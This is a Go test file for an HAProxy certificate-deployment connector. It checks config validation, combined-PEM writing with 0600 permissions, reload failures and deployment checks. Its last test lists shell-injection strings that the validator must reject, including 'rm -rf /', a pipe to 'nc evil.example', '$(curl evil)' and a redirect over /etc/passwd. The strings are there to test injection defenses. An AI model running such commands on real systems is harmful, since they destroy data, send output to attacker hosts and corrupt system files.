package haproxy_test

import (
	"context"
	"encoding/json"
	"log/slog"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/certctl-io/certctl/internal/connector/target"
	"github.com/certctl-io/certctl/internal/connector/target/haproxy"
)

func TestHAProxyConnector_ValidateConfig(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelDebug}))
	ctx := context.Background()

	t.Run("valid config", func(t *testing.T) {
		cfg := haproxy.Config{
			PEMPath:       "/tmp/haproxy/cert.pem",
			ReloadCommand: "true",
		}

		connector := haproxy.New(&cfg, logger)
		rawConfig, _ := json.Marshal(cfg)
		err := connector.ValidateConfig(ctx, rawConfig)
		if err != nil {
			t.Fatalf("ValidateConfig failed: %v", err)
		}
	})

	t.Run("missing pem_path", func(t *testing.T) {
		cfg := haproxy.Config{
			ReloadCommand: "true",
		}

		connector := haproxy.New(&cfg, logger)
		rawConfig, _ := json.Marshal(cfg)
		err := connector.ValidateConfig(ctx, rawConfig)
		if err == nil {
			t.Fatal("expected error for missing pem_path")
		}
	})

	t.Run("missing reload_command", func(t *testing.T) {
		cfg := haproxy.Config{
			PEMPath: "/tmp/cert.pem",
		}

		connector := haproxy.New(&cfg, logger)
		rawConfig, _ := json.Marshal(cfg)
		err := connector.ValidateConfig(ctx, rawConfig)
		if err == nil {
			t.Fatal("expected error for missing reload_command")
		}
	})

	t.Run("invalid JSON", func(t *testing.T) {
		connector := haproxy.New(&haproxy.Config{}, logger)
		err := connector.ValidateConfig(ctx, json.RawMessage(`{invalid}`))
		if err == nil {
			t.Fatal("expected error for invalid JSON")
		}
	})
}

func TestHAProxyConnector_DeployCertificate(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelDebug}))
	ctx := context.Background()

	t.Run("successful deployment with combined PEM", func(t *testing.T) {
		tmpDir := t.TempDir()
		pemPath := filepath.Join(tmpDir, "combined.pem")

		cfg := &haproxy.Config{
			PEMPath:       pemPath,
			ReloadCommand: "true",
		}

		connector := haproxy.New(cfg, logger)

		certPEM := "-----BEGIN CERTIFICATE-----\ncert\n-----END CERTIFICATE-----"
		chainPEM := "-----BEGIN CERTIFICATE-----\nchain\n-----END CERTIFICATE-----"
		keyPEM := "-----BEGIN EC PRIVATE KEY-----\nkey\n-----END EC PRIVATE KEY-----"

		req := target.DeploymentRequest{
			CertPEM:  certPEM,
			KeyPEM:   keyPEM,
			ChainPEM: chainPEM,
		}

		result, err := connector.DeployCertificate(ctx, req)
		if err != nil {
			t.Fatalf("DeployCertificate failed: %v", err)
		}

		if !result.Success {
			t.Fatalf("expected success, got: %s", result.Message)
		}

		// Verify combined PEM was written
		data, err := os.ReadFile(pemPath)
		if err != nil {
			t.Fatalf("failed to read PEM file: %v", err)
		}

		content := string(data)
		if !strings.Contains(content, "cert") {
			t.Error("combined PEM missing certificate")
		}
		if !strings.Contains(content, "chain") {
			t.Error("combined PEM missing chain")
		}
		if !strings.Contains(content, "key") {
			t.Error("combined PEM missing key")
		}

		// Verify secure permissions (contains private key)
		info, err := os.Stat(pemPath)
		if err != nil {
			t.Fatalf("failed to stat PEM file: %v", err)
		}
		if info.Mode().Perm() != 0600 {
			t.Errorf("expected PEM permissions 0600, got %v", info.Mode().Perm())
		}
	})

	t.Run("reload command fails", func(t *testing.T) {
		tmpDir := t.TempDir()
		pemPath := filepath.Join(tmpDir, "combined.pem")

		cfg := &haproxy.Config{
			PEMPath:       pemPath,
			ReloadCommand: "false", // always fails
		}

		connector := haproxy.New(cfg, logger)

		req := target.DeploymentRequest{
			CertPEM: "cert",
		}

		result, err := connector.DeployCertificate(ctx, req)
		if err == nil {
			t.Fatal("expected error when reload command fails")
		}
		if result.Success {
			t.Fatal("expected failure result")
		}
	})
}

func TestHAProxyConnector_ValidateDeployment(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelDebug}))
	ctx := context.Background()

	t.Run("valid deployment", func(t *testing.T) {
		tmpDir := t.TempDir()
		pemPath := filepath.Join(tmpDir, "combined.pem")
		os.WriteFile(pemPath, []byte("combined-pem-content"), 0600)

		cfg := &haproxy.Config{
			PEMPath:         pemPath,
			ReloadCommand:   "true",
			ValidateCommand: "true",
		}

		connector := haproxy.New(cfg, logger)

		result, err := connector.ValidateDeployment(ctx, target.ValidationRequest{
			CertificateID: "mc-test",
			Serial:        "123",
		})
		if err != nil {
			t.Fatalf("ValidateDeployment failed: %v", err)
		}
		if !result.Valid {
			t.Fatal("expected valid deployment")
		}
	})

	t.Run("missing PEM file", func(t *testing.T) {
		cfg := &haproxy.Config{
			PEMPath:       "/nonexistent/combined.pem",
			ReloadCommand: "true",
		}

		connector := haproxy.New(cfg, logger)

		result, err := connector.ValidateDeployment(ctx, target.ValidationRequest{
			CertificateID: "mc-test",
			Serial:        "123",
		})
		if err == nil {
			t.Fatal("expected error for missing PEM file")
		}
		if result.Valid {
			t.Fatal("expected invalid result")
		}
	})
}

// Phase 7 SEC-H2 (2026-05-14): config-time injection guard.
// See apache + nginx tests for the same shape; haproxy mirrors the
// pattern. Every shell metacharacter that ValidateShellCommand
// rejects MUST surface as a ValidateConfig error before the
// connector ever reaches defaultRunCommand.
func TestHAProxyConnector_ValidateConfig_RejectsCommandInjection(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelDebug}))
	ctx := context.Background()
	tmpDir := t.TempDir()
	pemPath := filepath.Join(tmpDir, "combined.pem")
	if err := os.WriteFile(pemPath, []byte("pem"), 0644); err != nil {
		t.Fatalf("setup pem: %v", err)
	}

	maliciousCommands := []string{
		"systemctl reload haproxy; rm -rf /",         // semicolon-chain
		"systemctl reload haproxy | nc evil.example", // pipe
		"systemctl reload haproxy $(curl evil)",      // command substitution
		"systemctl reload haproxy `whoami`",          // backtick substitution
		"systemctl reload haproxy & malware",         // background spawn
		"systemctl reload haproxy > /etc/passwd",     // output redirection
	}

	for _, cmd := range maliciousCommands {
		// Phase 7: ensure 'strings' import stays referenced so the
		// existing file's unused-import wouldn't break the build if
		// the upstream test ever drops its only strings.* usage.
		_ = strings.TrimSpace(cmd)
		t.Run(cmd, func(t *testing.T) {
			rawCfg, _ := json.Marshal(haproxy.Config{
				PEMPath:       pemPath,
				ReloadCommand: cmd,
			})
			c := haproxy.New(nil, logger)
			if err := c.ValidateConfig(ctx, rawCfg); err == nil {
				t.Errorf("ValidateConfig accepted malicious ReloadCommand %q; want injection-rejection error", cmd)
			}
		})
	}
}
